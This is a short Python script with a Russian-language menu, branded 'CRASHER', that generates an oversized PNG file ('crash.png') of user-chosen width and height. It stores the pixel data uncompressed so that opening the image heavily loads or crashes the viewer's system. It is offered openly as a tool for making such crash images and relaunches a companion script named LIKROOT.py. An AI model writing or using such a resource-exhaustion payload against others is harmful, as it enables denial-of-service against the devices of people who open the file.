import os
import colorama
from colorama import Fore
import platform


if platform.system() == "Windows": 
    st = "python LIKROOT.py"
    dl = "cls"
    os.system("cls")
else:
    dl = "clear"
    st = "python3 LIKROOT.py"
    os.system("clear")


colorama.init()

logo = """
 ╭━━━┳━━━┳━━━┳━━━┳╮╱╭┳━━━┳━━━╮
 ┃╭━╮┃╭━╮┃╭━╮┃╭━╮┃┃╱┃┃╭━━┫╭━╮┃
 ┃┃╱╰┫╰━╯┃┃╱┃┃╰━━┫╰━╯┃╰━━┫╰━╯┃
 ┃┃╱╭┫╭╮╭┫╰━╯┣━━╮┃╭━╮┃╭━━┫╭╮╭╯
 ┃╰━╯┃┃┃╰┫╭━╮┃╰━╯┃┃╱┃┃╰━━┫┃┃╰╮
 ╰━━━┻╯╰━┻╯╱╰┻━━━┻╯╱╰┻━━━┻╯╰━╯
"""

print (Fore.RED + logo)
print (Fore.YELLOW + "[=] CRASHER - УТИЛИТА ДЛЯ СОЗДАНИЯ ФОТО КОТОРЫЕ СИЛЬНО НАГРУЖАЮТ СИСТЕМУ [=]")




menu = '''

 1 = Cоздать ФОТО
 2 = ВЫХОД

'''
print (menu)

us = input("[=]Выбирай>")


if us == "2":
    os.system(dl)
    os.system(st)
    exit()


hx = input("Расширение Y:")
hy = input("Расширение X:")
os.system(dl)
print ("Ожидайте, создание может занять некоторое время...")


import zlib
import struct

def png_chunk(chunk_type, data):
    chunk = chunk_type + data
    length = struct.pack(">I", len(data))
    crc = struct.pack(">I", zlib.crc32(chunk) & 0xffffffff)
    return length + chunk + crc

def create_big_png(filename, width, height):

    
    png_signature = b'\x89PNG\r\n\x1a\n'

    
    ihdr_data = struct.pack(">IIBBBBB", width, height, 8, 6, 0, 0, 0)
    ihdr_chunk = png_chunk(b'IHDR', ihdr_data)

    
    row_data = b'\x00' + b'\xff\xff\xff\xff' * width
    raw_data = row_data * height

    
    compressed_data = zlib.compress(raw_data, level=0)
    idat_chunk = png_chunk(b'IDAT', compressed_data)

    iend_chunk = png_chunk(b'IEND', b'')

    with open(filename, 'wb') as f:
        f.write(png_signature)
        f.write(ihdr_chunk)
        f.write(idat_chunk)
        f.write(iend_chunk)


create_big_png("crash.png", int(hx), int(hy))







print ("!!! Картинка crash.png создана и находится в корневой папке !!! ")
print ("")
input("Нажмите Enter")
os.system(dl)
os.system(st)
exit()









